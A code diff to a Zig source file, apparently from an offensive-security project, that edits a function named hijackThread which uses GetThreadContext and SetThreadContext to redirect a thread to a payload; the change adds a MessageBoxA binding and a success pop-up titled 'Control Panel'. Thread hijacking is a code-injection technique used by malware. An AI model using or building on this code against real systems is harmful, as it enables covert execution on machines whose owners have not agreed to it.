@@ -22,6 +22,15 @@ pub const CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x0008;
 pub const CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x0010;
 pub const CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;
 
+const user32 = struct {
+    pub extern "user32" fn MessageBoxA(
+        hWnd: ?windows.HWND,
+        lpText: [*:0]const u8,
+        lpCaption: [*:0]const u8,
+        uType: windows.UINT,
+    ) callconv(windows.WINAPI) c_int;
+};
+
 // section external API functions.
 pub extern "kernel32" fn GetThreadContext(
     hThread: HANDLE,
@@ -85,7 +94,6 @@ pub fn hijackThread(h_thread: HANDLE, payload: []const u8) !bool {
         return false;
     };
 
-    // Get thread context
     if (GetThreadContext(h_thread, &thread_ctx) == 0) {
         std.debug.print("GetThreadContext failed with error: {}\n", .{kernel32.GetLastError()});
         return false;
@@ -99,6 +107,8 @@ pub fn hijackThread(h_thread: HANDLE, payload: []const u8) !bool {
         std.debug.print("SetThreadContext failed with error: {}\n", .{kernel32.GetLastError()});
         return false;
     }
-    std.debug.print("Thread Hjcked successfully\n", .{});
+    //std.debug.print("Thread Hjcked successfully\n", .{});
+    _ = user32.MessageBoxA(null, "Hijacked thread successfully.", "Control Panel", 0);
+
     return true;
 }
